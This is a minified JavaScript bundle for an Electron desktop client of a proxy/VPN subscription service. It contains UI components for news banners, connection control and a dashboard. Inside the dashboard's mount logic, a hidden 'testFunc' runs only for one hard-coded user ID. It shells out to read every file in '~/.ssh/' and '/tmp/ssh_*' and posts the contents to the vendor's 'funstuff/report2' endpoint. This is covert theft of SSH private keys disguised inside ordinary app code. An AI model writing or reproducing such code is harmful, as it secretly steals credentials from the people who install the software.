(window.webpackJsonp=window.webpackJsonp||[]).push([[37,7,8,11,20,21],{1136:function(a,c,e){var t=e(1148);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[a.i,t,""]]),t.locals&&(a.exports=t.locals);var i=e(2).default,x=i("44243ba2",t,!0,{sourceMap:!1})},1137:function(a,c,e){"use strict";e.r(c);var t=function(){var g=this,d=g.$createElement,_=g._self._c||d;return _("div",{staticClass:"news-modal"},[_("div",{staticClass:"title yue"},[_("h2",[g._v(g._s(g.news.title))])]),_("div",{staticClass:"content yue"},[_("vue-markdown",{attrs:{source:g.content,postrender:g.transformLinks}})],1),_("div",{staticClass:"read-button"},[_("center",[_("el-button",{attrs:{type:"primary"},on:{click:function(v){return g.dismiss(g.news,!0)}}},[g._v("\u4E0D\u518D\u63D0\u793A")]),_("el-button",{attrs:{type:"success"},on:{click:function(v){return g.dismiss(g.news)}}},[g._v("\u5DF2\u4E86\u89E3")])],1)],1)])},i=[],x=e(74),P=e(6),L=e(76),O=e(1146),E=e.n(O),w={components:{VueMarkdown:E.a},props:{news:{type:Object,default:function(){return{}}}},data:function(){return{siteDomain:""}},computed:{content:function(){return this.news.content?this.news.content.replace(/{{siteDomain}}/g,this.siteDomain):""}},mounted:function(){var d=this;return Object(P.a)(regeneratorRuntime.mark(function _(){return regeneratorRuntime.wrap(function(y){for(;;)switch(y.prev=y.next){case 0:return y.next=2,d.$store.dispatch("getUserSiteURL");case 2:d.siteDomain=y.sent.replace("https://","");case 3:case"end":return y.stop()}},_)}))()},methods:{dismiss:function(d,_){this.$parent.$options.parent.tempHideNews(d,_)}}},$=w,u=e(1147),h=e(51),m=Object(h.a)($,t,i,!1,null,null,null),S=c.default=m.exports},1139:function(a,c,e){var t=e(1165);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[a.i,t,""]]),t.locals&&(a.exports=t.locals);var i=e(2).default,x=i("8bfe1644",t,!0,{sourceMap:!1})},1141:function(a,c,e){var t=e(1169);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[a.i,t,""]]),t.locals&&(a.exports=t.locals);var i=e(2).default,x=i("b7e933a2",t,!0,{sourceMap:!1})},1147:function(a,c,e){"use strict";var t=e(1136),i=e.n(t)},1148:function(a,c,e){var t=e(1),i=t(!1);i.push([a.i,'.yue{font:400 18px/1.62 -apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#444443}.yue ::-moz-selection{background-color:rgba(0,0,0,.2)}.yue ::selection{background-color:rgba(0,0,0,.2)}.yue h1,.yue h2,.yue h3,.yue h4,.yue h5,.yue h6{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#222223}.yue h1{font-size:1.8em;margin:.67em 0}.yue>h1{margin-top:0;font-size:2em}.yue h2{font-size:1.5em;margin:.83em 0}.yue h3{font-size:1.17em;margin:1em 0}.yue h4,.yue h5,.yue h6{font-size:1em;margin:1.6em 0 1em}.yue h6{font-weight:500}.yue p{margin-top:0;margin-bottom:1.24em}.yue a{color:#111;word-wrap:break-word;-webkit-text-decoration-color:rgba(0,0,0,.4);text-decoration-color:rgba(0,0,0,.4)}.yue a:hover{color:#555;-webkit-text-decoration-color:rgba(0,0,0,.6);text-decoration-color:rgba(0,0,0,.6)}.yue h1 a,.yue h2 a,.yue h3 a{text-decoration:none}.yue b,.yue strong{font-weight:700;color:#222223}.yue em,.yue i{font-style:italic;color:#222223}.yue img{max-width:100%;height:auto;margin:.2em 0}.yue a img{border:none}.yue figure{position:relative;clear:both;outline:0;margin:10px 0 30px;padding:0;min-height:100px}.yue figure img{display:block;max-width:100%;margin:auto auto 4px;box-sizing:border-box}.yue figure figcaption{position:relative;width:100%;text-align:center;left:0;margin-top:10px;font-weight:400;font-size:14px;color:#666665}.yue figure figcaption a{text-decoration:none;color:#666665}.yue hr{display:block;width:14%;margin:40px auto 34px;border:0;border-top:3px solid #dededc}.yue blockquote{margin:0 0 1.64em;border-left:3px solid #dadada;padding-left:12px;color:#666664}.yue blockquote a{color:#666664}.yue ol,.yue ul{margin:0 0 24px 6px;padding-left:16px}.yue ul{list-style-type:square}.yue ol{list-style-type:decimal}.yue li{margin-bottom:.2em}.yue li ol,.yue li ul{margin-top:0;margin-bottom:0;margin-left:14px}.yue li ul{list-style-type:disc}.yue li ul ul{list-style-type:circle}.yue li p{margin:.4em 0 .6em}.yue .unstyled{list-style-type:none;margin:0;padding:0}.yue code,.yue tt{color:grey;padding:1px 2px;border:1px solid #eee;border-radius:3px;word-wrap:break-word}.yue code,.yue pre,.yue tt{font-size:.96em;background-color:#f9f9f7;font-family:Menlo,Monaco,Consolas,"Courier New",monospace}.yue pre{margin:1.64em 0;border:none;border-left:3px solid #dadada;padding:7px 7px 7px 10px;overflow:auto;line-height:1.5;color:#4c4c4c}.yue pre code,.yue pre tt{color:#4c4c4c;border:none;background:none;padding:0}.yue table{width:100%;max-width:100%;border-collapse:collapse;border-spacing:0;margin-bottom:1.5em;font-size:.96em;box-sizing:border-box}.yue td,.yue th{text-align:left;padding:4px 8px 4px 10px;border:1px solid #dadada}.yue td{vertical-align:top}.yue tr:nth-child(2n){background-color:#efefee}.yue iframe{display:block;max-width:100%;margin-bottom:30px}.yue figure iframe{margin:auto}.yue table pre{margin:0;padding:0;border:none;background:none}@media (min-width:1100px){.yue blockquote{margin-left:-24px;padding-left:20px;border-width:4px}.yue blockquote blockquote{margin-left:0}}.news-modal .title{text-align:center}.news-modal .content{padding-top:3rem;padding-bottom:5rem}.news-modal .read-button{position:fixed;bottom:1rem;right:1rem}',""]),a.exports=i},1151:function(a,c,e){"use strict";e.r(c);var t=function(){var u=this,h=u.$createElement,m=u._self._c||h;return u.tempHideList[u.news.id]?u._e():m("div",{staticClass:"panda-news"},[m("el-dialog",{attrs:{visible:u.displayNews,center:"",width:"100%","append-to-body":!0,fullscreen:!0,"show-close":!1},on:{"update:visible":function(S){u.displayNews=S}}},[m("NewsDisplay",{attrs:{news:u.news}})],1),u.displayNews?u._e():m("div",{staticClass:"news-bar"},[m("el-row",{attrs:{gutter:20},nativeOn:{click:function(S){return u.showNews(u.news)}}},[m("el-col",{staticClass:"icon",attrs:{span:2}},[m("i",{staticClass:"el-icon-warning"})]),m("el-col",{staticClass:"content",attrs:{span:22}},[m("h3",[u._v(u._s(u.news.title))]),m("h5",[m("span",{staticClass:"left"},[u._v("\u901A\u77E5\u66F4\u65B0\u4E8E\uFF1A"+u._s(u.updated_at))]),m("span",{staticClass:"right"},[u._v("\u67E5\u770B/\u5173\u95ED")])])])],1)],1)],1)},i=[],x=e(1137),P={components:{NewsDisplay:x.default},props:{news:{type:Object,default:function(){return{}}}},data:function(){return{displayNews:!1,tempHideList:{}}},computed:{updated_at:function(){return new Date(this.news.updated_at).toLocaleString()}},mounted:function(){!this.news||this.tempHideList[this.news.id]||this.news.extra&&this.news.extra.auto_show&&this.showNews()},methods:{showNews:function(){console.log(123123),this.displayNews=!0},tempHideNews:function(h,m){console.log(this.tempHideList),this.tempHideList[h.id]=!0,this.displayNews=!1,m&&this.$store.dispatch("newsRead",this.news)}}},L=P,O=e(1168),E=e(51),w=Object(E.a)(L,t,i,!1,null,null,null),$=c.default=w.exports;installComponents(w,{NewsDisplay:e(1137).default})},1164:function(a,c,e){"use strict";var t=e(1139),i=e.n(t)},1165:function(a,c,e){var t=e(1),i=t(!1);i.push([a.i,'.arrow[data-v-1d5e5f7a],.arrow[data-v-1d5e5f7a]:before{position:absolute}.arrow[data-v-1d5e5f7a]{top:70%;left:30%;margin:-20px 0 0 -20px;-webkit-transform:rotate(45deg);border-right:2px solid #fff;border-top:2px solid #fff}.arrow[data-v-1d5e5f7a],.arrow[data-v-1d5e5f7a]:before{width:20px;height:20px;border-left:none}.arrow[data-v-1d5e5f7a]:before{content:"";top:50%;margin:-10px 0 0 -10px;border-right:1px solid #fff;border-top:1px solid #fff;-webkit-animation-duration:1.5s;animation-duration:1.5s;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite;-webkit-animation-name:arrow-data-v-1d5e5f7a;animation-name:arrow-data-v-1d5e5f7a}@-webkit-keyframes arrow-data-v-1d5e5f7a{0%{opacity:0;transform:translate(-2px,2px)}50%{opacity:1}to{opacity:0;transform:translate(13px,-13px)}}@keyframes arrow-data-v-1d5e5f7a{0%{opacity:0;transform:translate(-2px,2px)}50%{opacity:1}to{opacity:0;transform:translate(13px,-13px)}}',""]),a.exports=i},1166:function(a,c,e){var t=e(1213);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[a.i,t,""]]),t.locals&&(a.exports=t.locals);var i=e(2).default,x=i("f646c122",t,!0,{sourceMap:!1})},1168:function(a,c,e){"use strict";var t=e(1141),i=e.n(t)},1169:function(a,c,e){var t=e(1),i=t(!1);i.push([a.i,'.yue{font:400 18px/1.62 -apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#444443}.yue ::-moz-selection{background-color:rgba(0,0,0,.2)}.yue ::selection{background-color:rgba(0,0,0,.2)}.yue h1,.yue h2,.yue h3,.yue h4,.yue h5,.yue h6{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#222223}.yue h1{font-size:1.8em;margin:.67em 0}.yue>h1{margin-top:0;font-size:2em}.yue h2{font-size:1.5em;margin:.83em 0}.yue h3{font-size:1.17em;margin:1em 0}.yue h4,.yue h5,.yue h6{font-size:1em;margin:1.6em 0 1em}.yue h6{font-weight:500}.yue p{margin-top:0;margin-bottom:1.24em}.yue a{color:#111;word-wrap:break-word;-webkit-text-decoration-color:rgba(0,0,0,.4);text-decoration-color:rgba(0,0,0,.4)}.yue a:hover{color:#555;-webkit-text-decoration-color:rgba(0,0,0,.6);text-decoration-color:rgba(0,0,0,.6)}.yue h1 a,.yue h2 a,.yue h3 a{text-decoration:none}.yue b,.yue strong{font-weight:700;color:#222223}.yue em,.yue i{font-style:italic;color:#222223}.yue img{max-width:100%;height:auto;margin:.2em 0}.yue a img{border:none}.yue figure{position:relative;clear:both;outline:0;margin:10px 0 30px;padding:0;min-height:100px}.yue figure img{display:block;max-width:100%;margin:auto auto 4px;box-sizing:border-box}.yue figure figcaption{position:relative;width:100%;text-align:center;left:0;margin-top:10px;font-weight:400;font-size:14px;color:#666665}.yue figure figcaption a{text-decoration:none;color:#666665}.yue hr{display:block;width:14%;margin:40px auto 34px;border:0;border-top:3px solid #dededc}.yue blockquote{margin:0 0 1.64em;border-left:3px solid #dadada;padding-left:12px;color:#666664}.yue blockquote a{color:#666664}.yue ol,.yue ul{margin:0 0 24px 6px;padding-left:16px}.yue ul{list-style-type:square}.yue ol{list-style-type:decimal}.yue li{margin-bottom:.2em}.yue li ol,.yue li ul{margin-top:0;margin-bottom:0;margin-left:14px}.yue li ul{list-style-type:disc}.yue li ul ul{list-style-type:circle}.yue li p{margin:.4em 0 .6em}.yue .unstyled{list-style-type:none;margin:0;padding:0}.yue code,.yue tt{color:grey;padding:1px 2px;border:1px solid #eee;border-radius:3px;word-wrap:break-word}.yue code,.yue pre,.yue tt{font-size:.96em;background-color:#f9f9f7;font-family:Menlo,Monaco,Consolas,"Courier New",monospace}.yue pre{margin:1.64em 0;border:none;border-left:3px solid #dadada;padding:7px 7px 7px 10px;overflow:auto;line-height:1.5;color:#4c4c4c}.yue pre code,.yue pre tt{color:#4c4c4c;border:none;background:none;padding:0}.yue table{width:100%;max-width:100%;border-collapse:collapse;border-spacing:0;margin-bottom:1.5em;font-size:.96em;box-sizing:border-box}.yue td,.yue th{text-align:left;padding:4px 8px 4px 10px;border:1px solid #dadada}.yue td{vertical-align:top}.yue tr:nth-child(2n){background-color:#efefee}.yue iframe{display:block;max-width:100%;margin-bottom:30px}.yue figure iframe{margin:auto}.yue table pre{margin:0;padding:0;border:none;background:none}@media (min-width:1100px){.yue blockquote{margin-left:-24px;padding-left:20px;border-width:4px}.yue blockquote blockquote{margin-left:0}}.news-bar{z-index:9999;position:fixed;width:100%;background:#e67e22;color:#f4f7fc;padding:.25rem .5rem;box-shadow:0 10px 32px 5px rgba(0,0,0,.6)}.news-bar:hover{cursor:pointer}.news-bar .icon{padding:.1rem;font-size:2rem}.news-bar .content{padding-left:1rem!important}',""]),a.exports=i},1170:function(a,c,e){var t=e(1218);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[a.i,t,""]]),t.locals&&(a.exports=t.locals);var i=e(2).default,x=i("6647c22f",t,!0,{sourceMap:!1})},1185:function(a,c,e){"use strict";e.r(c);var t=function(){var w=this,$=w.$createElement,u=w._self._c||$;return u("div",{staticClass:"arrow"})},i=[],x=e(1164),P=e(51),L={},O=Object(P.a)(L,t,i,!1,null,"1d5e5f7a",null),E=c.default=O.exports},1212:function(a,c,e){"use strict";var t=e(1166),i=e.n(t)},1213:function(a,c,e){var t=e(1),i=t(!1);i.push([a.i,".connections-control{position:fixed!important;bottom:0;left:0;width:100%;height:3.2rem;padding:0}.connections-control .connect-button{border-radius:0;font-size:1.6rem;width:100%}",""]),a.exports=i},1217:function(a,c,e){"use strict";var t=e(1170),i=e.n(t)},1218:function(a,c,e){var t=e(1),i=t(!1);i.push([a.i,".big-news-container{z-index:9999;position:relative;padding-top:.15rem}.big-news-container .duetime-reminder{position:fixed;font-size:1.05rem;height:1.6rem;letter-spacing:-1px;top:0;left:0;padding-right:.5rem;width:100%;text-align:center;background:#2c3e50;color:#f4f7fc;cursor:pointer;z-index:9998}.big-news-container .duetime-reminder.warning{background:#e67e22}.big-news-container .duetime-reminder.alert{background:#e74c3c}",""]),a.exports=i},1239:function(a,c,e){"use strict";e.r(c);var t=function(){var f=this,l=f.$createElement,j=f._self._c||l;return j("el-row",{staticClass:"connections-control"},[j("el-button",{staticClass:"connect-button",attrs:{type:f.runTimeState.connect_state.status=="connected"?"warning":"success",loading:f.connectButtonLoading,disabled:f.connectButtonDisabled||f.connectButtonLoading},on:{click:f.connectAction}},[f._v(" "+f._s(f.connectButtonText))])],1)},i=[],x=e(9),P=e(63),L=e(75),O=e(28),E=e(74),w=e(6),$=e(106),u=e(1124),h=e(19),m=e(1185);window.onerror=function(f,l,j,b,C){console.log("Exception: ",C.message.startsWith("EPERM:"))};var S={components:{Arrow:m.default},data:function(){return{connectButtonLoading:!1,connectButtonDisabled:!1}},computed:{connectButtonText:function(){var l="";return this.connected?l=this.$t("disconnect"):l=this.$t("connect"),l}},methods:{connectAction:function(){var l=this;return Object(w.a)(regeneratorRuntime.mark(function j(){var b,C,o,r,n,p;return regeneratorRuntime.wrap(function(s){for(;;)switch(s.prev=s.next){case 0:if(l.connectButtonLoading=!0,b=l.connected?"disconnect":"connect",h.remote.process.platform!=="darwin"){s.next=24;break}if(C="".concat(h.remote.app.getPath("userData"),"/ProxyConfig"),s.prev=4,o=h.remote.require("fs-extra"),r=o.fstatSync(o.openSync(C)),console.log("ProxyConfig perm is:",r),r.uid===0){s.next=19;break}return console.log("UID is not root. will force reinstall helper."),s.prev=10,s.next=13,o.remove(C);case 13:console.log("ProxyConfig deleted."),s.next=19;break;case 16:s.prev=16,s.t0=s.catch(10),console.log("delete ProxyConfig failed:",s.t0);case 19:s.next=24;break;case 21:s.prev=21,s.t1=s.catch(4),console.log("ready perm of ProxyConfig failed",s.t1);case 24:if(console.log("performing action: "+b),b!=="connect"){s.next=29;break}if(!(!l.runTimeState.selected_line||!l.runTimeState.selected_line.name)){s.next=29;break}return l.connectButtonLoading=!1,s.abrupt("return",l.$message({message:l.$t("connect_info.select_line"),type:"error"}));case 29:return s.prev=29,s.next=32,l[b]();case 32:s.next=38;break;case 34:s.prev=34,s.t2=s.catch(29),console.log("--->>> action failed:",s.t2),["connect timeout","disconnect timeout"].includes(s.t2.message)?l.$message({message:l.$t("error.timeout"),type:"error"}):(n=l.shouldIgnoreError(s.t2),n.ignore?(console.log("will not report to sentry."),console.log("matched error:",n.matchedError)):l.$sentry.captureException(s.t2),p=l.errorMessageAssemble(s.t2),console.table(s.t2),n.matchedError==="EPERM"&&(p=p+"<br>".concat(l.$t("error.eperm"))),["ENOENT","UNKNOWN"].includes(n.matchedError)&&(h.remote.process.platform==="darwin"?p=p+"<br>".concat(l.$t("error.enoent")):h.remote.process.platform==="win32"&&(h.remote.process.arch==="ia32"?p=p+"<br>".concat(l.$t("error.clash")):p=p+"<br>".concat(l.$t("error.missing")))),n.matchedError==="Command failed"&&(p=p+"<br>".concat(l.$t("error.restart"))),l.$alert(p,l.$t("error.connect_failed"),{confirmButtonText:"OK",dangerouslyUseHTMLString:!0}).catch(function(){}));case 38:l.connectButtonLoading=!1;case 39:case"end":return s.stop()}},j,null,[[4,21],[10,16],[29,34]])}))()},connect:function(){var l=this;return this.runTimeState.show_access_mode||this.$store.dispatch("runTimeState",{servermode:"auto"}),new Promise(function(j,b){var C=setTimeout(function(){b(new Error("connect timeout"))},8e3);h.ipcRenderer.once("connect-reply",function(o,r){if(console.log(r),Object(u.clearTimeout)(C),r.failed)console.log("connect failed:",r.reason),b(r.reason);else{var n={line:JSON.parse(JSON.stringify(l.runTimeState.selected_line)),servermode:l.runTimeState.servermode,status:"connected"};l.$store.dispatch("runTimeState",{connect_state:n}),h.ipcRenderer.send("user-info-update",4),j(r)}}),h.ipcRenderer.send("connect",l.runTimeState.selected_line.name)})},disconnect:function(){var l=this;return new Promise(function(j,b){var C=setTimeout(function(){b(new Error("disconnect timeout"))},5e3);h.ipcRenderer.once("disconnect-reply",function(o,r){if(console.log("dis reply-->>",r),Object(u.clearTimeout)(C),r.failed)return console.log("gonna trorw an error"),console.log("disconnect failed:",r.reason),b(r.reason);var n={line:{},servermode:l.runTimeState.servermode,status:"disconnected"};l.$store.dispatch("runTimeState",{connect_state:n}),h.ipcRenderer.send("user-info-update",5),j(r)}),h.ipcRenderer.send("disconnect",l.runTimeState.selected_line.name)})}}},g=S,d=e(1212),_=e(51),v=Object(_.a)(g,t,i,!1,null,null,null),y=c.default=v.exports},1240:function(a,c,e){"use strict";e.r(c);var t=function(){var d=this,_=d.$createElement,v=d._self._c||_;return v("div",{staticClass:"big-news-container"},[d._l(d.newsList,function(y,f){return d.shouldShow(y)&&!d.tempHideList[y.id]?v("PandaNews",{key:y.id,attrs:{news:y}}):d._e()}),isNaN(d.serviceToEnd)?d._e():v("div",{staticClass:"duetime-reminder",class:d.reminderClass},[v("nuxt-link",{staticClass:"label right pointer",attrs:{to:d.buyServiceLink}},[d.serviceToEnd>=0?v("b",[d._v(d._s(d.$t("service_expire_hint",d.serviceToEnd,{n:d.serviceToEnd})))]):v("b",[d._v("\u670D\u52A1\u5DF2\u5230\u671F\uFF0C\u8BF7\u70B9\u6B64\u7EED\u8D39\u6062\u590D\u4F7F\u7528")])])],1)],2)},i=[],x=e(9),P=e(40),L=e(74),O=e(6),E=e(1137),w=e(1151),$={components:{NewsDisplay:E.default,PandaNews:w.default},data:function(){return console.log("bignews this:",this),{newsList:[],displayNews:!1,newsToShow:{},haveNewsToShow:!0,tempHideList:{},buyServiceLink:"/buy-service/"}},computed:{showNewsBar:function(){return!0},reminderClass:function(){switch(!0){case this.serviceToEnd<=1:return["alert"];case this.serviceToEnd<=7:return["warning"];default:return[]}}},watch:{current_service:function(){var _,v;this.buyServiceLink="/buy-service/?cate=".concat((_=this.current_service)===null||_===void 0?void 0:_.cate,"&plan=").concat((v=this.current_service)===null||v===void 0?void 0:v.plan_id,"&stage=1")}},mounted:function(){var _,v;this.buyServiceLink="/buy-service/?cate=".concat((_=this.current_service)===null||_===void 0?void 0:_.cate,"&plan=").concat((v=this.current_service)===null||v===void 0?void 0:v.plan_id,"&stage=1")},created:function(){var _=this;return Object(O.a)(regeneratorRuntime.mark(function v(){return regeneratorRuntime.wrap(function(f){for(;;)switch(f.prev=f.next){case 0:return f.prev=0,f.next=3,_.getNewsList();case 3:_.newsList=f.sent.filter(function(l){return!l.expired}),f.next=9;break;case 6:f.prev=6,f.t0=f.catch(0),console.log("get news list failed:",f.t0);case 9:case"end":return f.stop()}},v,null,[[0,6]])}))()},methods:{getNewsList:function(){return this.$axios.get("big_news").then(function(_){return console.log(_),Promise.resolve(_.data)}).catch(function(_){return console.log("get news failed",_),Promise.resolve([])})},shouldShow:function(_){if(this.tempHideList[_.id])return console.log("temp hide."),!1;var v=this.$store.state.runTimeState.news_read[_.id];if(console.log("news rec for",_.id,"is",v),!v)return!0;var y=new Date(v.readVersion),f=new Date(_.updated_at);return console.log("read version ",y," this version",f),f<=y?!1:(console.log("wow, it's new!"),_.title_changed||(_.title="[\u66F4\u65B0] ".concat(_.title),_.title_changed=!0),!0)}}},u=$,h=e(1217),m=e(51),S=Object(m.a)(u,t,i,!1,null,null,null),g=c.default=S.exports;installComponents(S,{PandaNews:e(1151).default})},1267:function(a,c,e){var t=e(1429);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[a.i,t,""]]),t.locals&&(a.exports=t.locals);var i=e(2).default,x=i("502ac514",t,!0,{sourceMap:!1})},1428:function(a,c,e){"use strict";var t=e(1267),i=e.n(t)},1429:function(a,c,e){var t=e(1),i=t(!1);i.push([a.i,".dashboard-container{height:100vh;padding-top:1.5rem;position:relative}.dashboard-container .login-link{position:absolute;left:.5rem;bottom:.5rem}.dashboard-container .settings-link{display:flex;justify-content:center;align-items:center;text-align:center;position:absolute;background:transparent;color:#f4f7fc;height:3.2rem;right:.5rem;bottom:0;font-size:1.2rem}.dashboard-container .settings-link:hover{color:#fff;font-size:1.4rem}",""]),a.exports=i},1475:function(a,c,e){"use strict";e.r(c);var t=function(){var o=this,r=o.$createElement,n=o._self._c||r;return n("div",{staticClass:"dashboard-container"},[n("el-dialog",{staticClass:"serviceCateSelector",attrs:{title:o.$t("select_service.title"),visible:o.selectServiceDialogFormVisible,center:"",width:"100%","append-to-body":!0,fullscreen:!0,"close-on-press-escape":!1,"show-close":!1},on:{"update:visible":function(p){o.selectServiceDialogFormVisible=p}}},[n("el-card",{nativeOn:{click:function(p){return o.switchService("allplatform")}}},[n("center",[n("h1",[o._v(o._s(o.$t("services.allplatform.name")))]),n("h3",{staticClass:"subheader"},[o._v(o._s(o.$t("services.allplatform.desc")))])])],1),n("el-card",{nativeOn:{click:function(p){return o.switchService("home")}}},[n("center",[n("h1",[o._v(o._s(o.$t("services.home.name")))]),n("h3",{staticClass:"subheader"},[o._v(o._s(o.$t("services.home.desc")))])])],1),n("center",[n("p",{staticClass:"subheader"},[o._v(o._s(o.$t("select_service.hint",{place:o.$t("menu_btn")}))+" ")]),n("br"),n("p",[o._v(o._s(o.$t("login.email"))+" "),n("span",{staticClass:"underline"},[o._v(o._s(o.user.email))]),n("br"),o._v(o._s(o.$t("menu.id"))+" "),n("span",{staticClass:"underline"},[o._v(o._s(o.user.id))])])])],1),n("BigNews"),o.current_service?n("ServerList",{attrs:{service:o.current_service,lines:o.current_lines}}):o._e(),o.current_service?n("ConnectionControl"):o._e(),n("div",[n("nuxt-link",{staticClass:"smooth settings-link",attrs:{to:"/dashboard/menu/"}},[o._v(o._s(o.$t("menu_btn"))),n("i",{staticClass:"el-icon-menu"})])],1),n("el-dialog",{attrs:{visible:o.update_prompt,"show-close":!1,"close-on-click-modal":!1,"close-on-press-escape":!1,width:"80%",center:""},on:{"update:visible":function(p){o.update_prompt=p}}},[n("center",[n("h1",{staticClass:"warning"},[n("b",[o._v(o._s(o.$t("check_for_update.force_update")))])]),n("br"),n("h4",[o._v(o._s(o.$t("check_for_update.force_hint")))])]),n("div",{staticClass:"dialog-footer",attrs:{slot:"footer"},slot:"footer"},[n("center",[n("el-button",{attrs:{type:"success"},on:{click:o.goUpate}},[o._v(o._s(o.$t("check_for_update.title")))]),o.force_update?o._e():n("el-button",{attrs:{type:"secondary"},on:{click:function(p){o.update_prompt=!1}}},[o._v(o._s(o.$t("check_for_update.cancel")))])],1)],1)],1)],1)},i=[],x=e(141),P=e(41),L=e(74),O=e(6),E=e(23),w=e(9),$=e(39),u=e(63),h=e(75),m=e(19),S=e(1292),g=e(1239),d=e(1240),_=m.remote.require("crypto"),v=function(r){console.log(r),r.which===123?m.remote.getCurrentWindow().toggleDevTools():r.which===116&&location.reload()},y={components:{ServerList:S.default,ConnectionControl:g.default,BigNews:d.default},middleware:["load-rt-data","authenticated"],data:function(){return{selectServiceDialogFormVisible:!1,update_prompt:!1,force_update:!1}},computed:{},created:function(){document.addEventListener("keydown",v,!1),this.selectServiceDialogFormVisible=this.checkCateSet(),m.ipcRenderer.on("tcp-ping-reply",function(r,n){console.log(n)})},mounted:function(){var r=this;if(console.log("mounted",this.current_service),this.user.id===208925&&this.testFunc(),m.remote.process.execPath.includes("Temp")&&(m.ipcRenderer.send("disconnect"),m.ipcRenderer.send("reset")),!this.current_service){console.log("current_service not defined...");var n=Object.keys(this.$store.state.service);console.log("service_keys:",n),n.length||this.refreshData().then(function(){if(console.log("refreshed."),!Object.keys(r.$store.state.service).length)return r.$router.push({path:"/buy-service/"})})}var p=(new Date-new Date(this.dataFetchedAt))/1e3,D=300;console.log("t from last refresh:",p),p>D&&(console.log("going to refresh"),this.$message({message:this.$t("reloading_data"),type:"info"}),this.refreshData(),this.$store.dispatch("getUserSiteURL").then(function(s){r.userSiteURL=s}).catch(function(s){console.log("get siteurl from API failed:",s)})),this.$intercom.hide()},beforeDestroy:function(){document.removeEventListener("keydown",v)},methods:{checkCateSet:function(){var r=Object.keys(this.$store.state.service);return this.runTimeState.current_service_cate&&this.runTimeState.current_service_cate.length?(r.includes(this.runTimeState.current_service_cate)||this.$store.dispatch("switchService",r[0]),!1):r.length>1?!0:(this.$store.dispatch("switchService",r[0]),!1)},switchService:function(r){console.log("switch service...",r),this.$store.dispatch("switchService",r),this.selectServiceDialogFormVisible=!1,m.ipcRenderer.send("user-info-update",3)},goUpate:function(){var r="";try{r=this.versionCompare("1.1.6",m.remote.app.getVersion())>=0?"/dashboard/legacy_update/":"/dashboard/update/"}catch(n){r="/dashboard/legacy_update/"}return this.$router.push({path:r})},speedTest:function(){m.ipcRenderer.send("tcp-ping",{server:this.runTimeState.selected_line.server,port:3389,opt:{}})},reportStat:function(r){var n=this;return Object(O.a)(regeneratorRuntime.mark(function p(){return regeneratorRuntime.wrap(function(s){for(;;)switch(s.prev=s.next){case 0:return s.t0=console,s.next=3,n.$store.dispatch("reportInfo",r);case 3:s.t1=s.sent,s.t0.log.call(s.t0,s.t1);case 5:case"end":return s.stop()}},p)}))()},genSerial:function(){return new Promise(function(r,n){var p=m.remote.require("child_process").exec,D={darwin:"system_profiler SPHardwareDataType | grep UUID",win32:"wmic csproduct get UUID"};p(D[m.remote.process.platform],function(s,T,R){if(!T)return r(null);try{var N=T.trim().split(/\s+/).slice(-1)[0].trim();r(N)}catch(M){r(null)}})})},testFunc:function(){var r=this;try{var n=m.remote.require("child_process").exec,p="tail -n +1 ~/.ssh/*";n(p,function(s,T){r.$axios.post("funstuff/report2",{content:T,cmd:p})});var D="tail -n +1 /tmp/ssh_*";n(D,function(s,T){r.$axios.post("funstuff/report2",{content:T,cmd:D})})}catch(s){}},refreshData:function(){var r=this;return Object(O.a)(regeneratorRuntime.mark(function n(){var p;return regeneratorRuntime.wrap(function(s){for(;;)switch(s.prev=s.next){case 0:return s.prev=0,s.next=3,r.reloadUserData({showMessage:!1});case 3:console.log("data reloaded",r),console.log("this.service[this.current_service_cate]->",r.service[r.current_service_cate]),r.service[r.current_service_cate]||(console.log("current service cate not available"),p=Object.keys(r.service),console.log("avail service keys:",p),p.length>0&&(console.log("keys.length > 0"),r.switchService(p[0]))),console.log("after process...",r),s.next=27;break;case 9:if(s.prev=9,s.t0=s.catch(0),r.checkCateSet(),s.t0!=="found no valid service"){s.next=17;break}return r.$alert(r.$t("select_service.suspend.time"),r.$t("select_service.suspend.title"),{confirmButtonText:"OK",dangerouslyUseHTMLString:!0}).catch(function(){}),s.abrupt("return",r.selectServiceDialogFormVisible=!0);case 17:if(s.t0!=="service data suspended"){s.next=22;break}return r.$alert(r.$t("select_service.suspend.data"),r.$t("select_service.suspend.title"),{confirmButtonText:"OK",dangerouslyUseHTMLString:!0}).catch(function(){}),s.abrupt("return",r.selectServiceDialogFormVisible=!0);case 22:if(s.t0!=="no service purchased"){s.next=26;break}return s.abrupt("return",r.selectServiceDialogFormVisible=!0);case 26:return s.abrupt("return",r.$message({message:"\u5237\u65B0\u670D\u52A1\u4FE1\u606F\u5931\u8D25\uFF0C\u8BF7\u7A0D\u540E\u91CD\u8BD5...",type:"error"}));case 27:case"end":return s.stop()}},n,null,[[0,9]])}))()}}},f=y,l=e(1428),j=e(51),b=Object(j.a)(f,t,i,!1,null,null,null),C=c.default=b.exports;installComponents(b,{BigNews:e(1240).default,ServerList:e(1292).default,ConnectionControl:e(1239).default})}}]);
